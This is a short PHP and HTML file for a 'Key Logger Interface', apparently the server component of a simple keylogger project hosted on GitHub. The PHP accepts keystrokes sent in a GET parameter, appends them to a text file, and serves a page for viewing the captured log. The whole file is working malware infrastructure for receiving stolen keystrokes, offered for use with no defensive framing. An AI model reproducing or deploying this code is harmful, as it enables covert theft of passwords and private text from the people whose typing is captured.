<?php

// remove cache
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$path_to_file_text = "./key_logger.txt";

// get the key and read the file
if (isset($_GET['key_info'])) {

    $key = urldecode($_GET['key_info']);

    file_put_contents(
        $path_to_file_text,
        $key . "",
        FILE_APPEND
    );
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- remove cache -->
    <meta http-equiv="expires" content="Sun, 01 Jan 2014 00:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <title>Key Logger Interface</title>

    <link rel="stylesheet" type="text/css" href="./assets/css/style.css" />

    <script src="./assets/js/main.js" defer></script>
</head>

<body>

    <nav>
        <ul>
            <li><a href="./index.php">Refresh</a></li>
            <li><a href="./key_logger.txt" target="_blank">Open file </a></li>
            <li><a href="https://github.com/Gwigzz/simple_key_logger_py" target="_blank">Github</a></li>
        </ul>
    </nav>

    <h1>Key Logger Interface</h1>

    <button type="button" id="btn-auto-refresh"></button>
    <div id="get-text-logger"></div>




</body>

</html>